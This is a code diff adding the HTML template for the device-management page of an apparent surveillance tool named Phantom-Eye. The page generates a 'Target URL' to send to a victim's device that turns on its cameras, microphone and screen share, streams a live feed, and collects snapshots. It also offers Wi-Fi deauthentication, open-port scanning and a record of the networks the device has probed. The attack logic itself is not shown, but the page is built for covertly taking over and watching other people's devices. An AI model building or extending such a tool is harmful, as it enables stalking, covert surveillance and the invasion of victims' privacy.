@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Management | Phantom-Eye</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1><a href="/" style="color: inherit; text-decoration: none;">Phantom-Eye</a> / Device Management</h1>
+            <div id="status-bar">
+                <span id="mac-display" class="mac">...</span>
+            </div>
+        </header>
+
+        <main class="grid-layout">
+            <div class="card" id="device-info-card">
+                <h2>Device Information</h2>
+                <div class="info-grid">
+                    <div class="info-item"><label>Vendor:</label> <span id="info-vendor">Loading...</span></div>
+                    <div class="info-item"><label>Type/OS:</label> <span id="info-type">Loading...</span></div>
+                    <div class="info-item"><label>IP Address:</label> <span id="info-ip" class="mac">Unknown</span>
+                    </div>
+                    <div class="info-item"><label>Signal:</label> <span id="info-signal">Loading...</span></div>
+                    <div class="info-item"><label>Status:</label> <span id="info-status" class="status-pill">...</span>
+                    </div>
+                </div>
+                <button onclick="location.href='/viewer/{{ device.mac.replace(':', '-') }}';" class="btn-primary"
+                    style="margin-top: 1.5rem; background: var(--success);">Open Dedicated Viewer</button>
+            </div>
+
+            <div class="card" id="deploy-card">
+                <h2>One-Click Deployment</h2>
+                <p class="subtitle">Select features to activate on target device.</p>
+                <div class="feature-selection">
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="feat-cam-front" checked>
+                        <span class="checkmark"></span> Front Camera
+                    </label>
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="feat-cam-back" checked>
+                        <span class="checkmark"></span> Rear Camera
+                    </label>
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="feat-mic" checked>
+                        <span class="checkmark"></span> Microphone
+                    </label>
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="feat-screen">
+                        <span class="checkmark"></span> Screen Share
+                    </label>
+                </div>
+                <button id="deploy-btn" class="btn-primary">Generate Deployment URL</button>
+                <div id="delivery-box" style="display: none;">
+                    <label>Target URL:</label>
+                    <div class="copy-input">
+                        <input type="text" id="target-url" readonly>
+                        <button onclick="copyUrl()">Copy</button>
+                    </div>
+                    <p class="hint">Send this URL to the target device via any medium.</p>
+                </div>
+            </div>
+
+            <div class="card" id="intel-card">
+                <h2>Target Intelligence</h2>
+                <p class="subtitle">Discovered services and open ports.</p>
+                <div class="table-container" style="margin-top: 1rem;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>Protocol</th>
+                                <th>Service / Product</th>
+                            </tr>
+                        </thead>
+                        <tbody id="ports-list">
+                            <tr>
+                                <td colspan="3" class="status-waiting">Scanning for open ports...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card" id="stealth-card">
+                <h2>Stealth Reconnaissance</h2>
+                <p class="subtitle">Zero-interaction packet-level operations.</p>
+                <div class="stealth-actions">
+                    <button id="deauth-btn" class="btn-primary" style="background: var(--danger);">Force Reconnect
+                        (Deauth)</button>
+                </div>
+                <div id="ssid-history" style="margin-top: 1.5rem;">
+                    <label>Probed Networks (SSID History):</label>
+                    <div id="ssid-list" class="ssid-tag-container">
+                        <span class="status-pill">None detected</span>
+                    </div>
+                </div>
+                <div id="assoc-ap" style="margin-top: 1rem;">
+                    <label>Associated AP:</label>
+                    <span id="info-ap" class="mac">Unknown</span>
+                </div>
+            </div>
+
+            <div class="card full-width" id="live-view-card">
+                <h2>Live Intelligence Feed</h2>
+                <div id="stream-status" class="status-waiting">Waiting for target check-in...</div>
+                <div id="video-grid" class="video-grid">
+                    <!-- Video feeds will appear here -->
+                </div>
+            </div>
+
+            <div class="card full-width" id="snapshot-gallery-card">
+                <h2>Intelligence Gallery (Snapshots)</h2>
+                <div id="snapshot-gallery" class="snapshot-grid">
+                    <!-- Photos will appear here -->
+                </div>
+            </div>
+        </main>
+    </div>
+    <script src="{{ url_for('static', filename='js/device.js') }}"></script>
+</body>
+
+</html>
